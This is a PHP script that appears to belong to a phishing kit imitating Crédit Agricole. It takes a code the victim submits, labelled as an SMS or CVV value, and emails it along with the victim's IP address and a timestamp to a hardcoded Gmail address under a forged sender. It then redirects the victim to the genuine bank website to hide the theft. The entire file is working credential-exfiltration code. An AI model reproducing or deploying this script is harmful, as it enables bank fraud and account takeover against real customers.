<?php
session_start();

if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "============================================================\n";
$message .= "------------------+ CA Information +------------------------\n";
$message .= "============================================================\n";
$message .= "Sms       : ".$_POST['cvv']."\n";
$message .= "============================================================\n";
$message .= "------------------+ sms by client +----------------\n";
$message .= "============================================================\n";

$send="rajla8080@gmail.com";
$subject = "SMS Jaa | $ip | $date";
$headers = "From: Mr.Sms <don@mox.fr>";

mail($send,$subject,$message,$headers);

header("Location:  https://www.credit-agricole.fr");

?>